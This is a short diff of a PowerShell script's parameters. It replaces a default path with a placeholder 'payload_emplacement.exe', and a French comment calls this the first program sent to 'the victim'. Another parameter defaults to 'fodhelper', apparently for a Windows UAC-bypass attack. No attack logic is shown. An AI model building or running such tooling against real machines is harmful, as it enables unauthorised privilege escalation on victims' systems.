@@ -1,5 +1,5 @@
 param(
-    [String]$programPath = "c:\users\malack\force.exe", # Par défaut
+    [String]$programPath = "c:\users\user_name\payload_emplacement.exe", # Spécifie l'emplacement de notre premier programme envoyé à la victime (Paramètre à modifier)
     [String]$k = "fodhelper"  # Par défaut
 )
 
